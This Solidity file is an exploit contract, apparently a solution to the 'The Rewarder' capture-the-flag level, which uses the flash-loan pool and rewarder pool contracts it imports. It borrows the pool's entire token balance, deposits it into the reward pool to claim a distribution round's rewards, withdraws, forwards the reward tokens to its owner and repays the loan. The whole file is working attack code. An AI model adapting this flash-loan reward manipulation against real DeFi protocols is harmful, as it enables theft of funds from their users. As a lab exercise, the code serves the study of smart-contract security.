pragma solidity ^0.6.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract Attack {

    FlashLoanerPool FlashPool;
    IERC20  LiqToken;
    TheRewarderPool RewardPool;
    IERC20 RewardToken;
    address owner;

    constructor (address flashPoolAddress, address tokenAddress, address rewardAddress, address rewardTokenAddress) public {
        FlashPool = FlashLoanerPool(flashPoolAddress);
        LiqToken = IERC20(tokenAddress);
        RewardPool = TheRewarderPool(rewardAddress);
        RewardToken = IERC20(rewardTokenAddress);
        owner = msg.sender;
    }

    function attack() public {
        FlashPool.flashLoan(LiqToken.balanceOf(address(FlashPool)));
    }

    function receiveFlashLoan(uint256 amount) external {

        LiqToken.approve(address(RewardPool), amount);
        RewardPool.deposit(amount);   // calls distribute rewards for us
        RewardPool.withdraw(amount);
        RewardToken.transfer(owner, RewardToken.balanceOf(address(this)));

        // repay
        LiqToken.transfer(msg.sender, amount);
    }
}
